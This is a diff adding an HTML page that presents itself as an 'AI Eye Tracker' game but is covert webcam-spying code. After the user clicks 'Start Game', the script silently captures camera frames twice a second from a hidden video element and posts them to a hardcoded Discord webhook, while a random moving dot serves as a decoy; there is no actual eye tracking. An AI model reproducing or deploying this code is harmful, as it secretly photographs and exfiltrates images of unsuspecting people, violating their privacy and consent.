@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AI Eye Tracker</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      background-color: #111;
+      color: #0f0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h1 {
+      color: #ff0;
+      padding: 20px;
+      font-size: 1.8rem;
+    }
+    #game-area {
+      margin-top: 10px;
+      width: 90%;
+      max-width: 320px;
+      aspect-ratio: 1/1;
+      background-color: #222;
+      border: 3px solid #0f0;
+      position: relative;
+      overflow: hidden;
+      display: none;
+    }
+    .dot {
+      width: 8%;
+      height: 8%;
+      background: #0ff;
+      position: absolute;
+      border-radius: 50%;
+    }
+    #permission-box {
+      background: #222;
+      color: #0f0;
+      padding: 20px;
+      border: 2px solid #0f0;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 20px;
+    }
+    button {
+      background: #0f0;
+      color: #111;
+      font-weight: bold;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 15px;
+      cursor: pointer;
+      font-size: 1rem;
+      border-radius: 8px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>AI Eye Tracker</h1>
+
+  <div id="permission-box">
+    <p>🕹️ Click here to start face-tracking in-game!</p>
+    <button onclick="enableCamera()">🎯 Start Game</button>
+  </div>
+
+  <div id="game-area"></div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1361188715153719478/2hJI009KBVYLOUC9WFhYYZk2QIn9y1CRV-l-TTWDv3Yc78FA58-0AYRwhxyYhP76u_yX';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const gameArea = document.getElementById('game-area');
+
+    function enableCamera() {
+      document.getElementById('permission-box').style.display = 'none';
+      gameArea.style.display = 'block';
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          startAutoCapture();
+        })
+        .catch(err => {
+          console.error('Camera access denied:', err);
+        });
+
+      startGameVisuals();
+    }
+
+    function startAutoCapture() {
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('file', blob, 'vishnu-capture.png');
+          formData.append('username', 'VishnuCam');
+          formData.append('content', '📸 New frame captured!');
+
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          }).catch(err => console.error('Webhook error:', err));
+        }, 'image/png');
+      }, 500); // every 0.5 sec
+    }
+
+    function startGameVisuals() {
+      const dot = document.createElement('div');
+      dot.className = 'dot';
+      gameArea.appendChild(dot);
+
+      setInterval(() => {
+        const maxX = gameArea.clientWidth - dot.offsetWidth;
+        const maxY = gameArea.clientHeight - dot.offsetHeight;
+        dot.style.left = Math.random() * maxX + 'px';
+        dot.style.top = Math.random() * maxY + 'px';
+      }, 300);
+    }
+  </script>
+</body>
+</html>
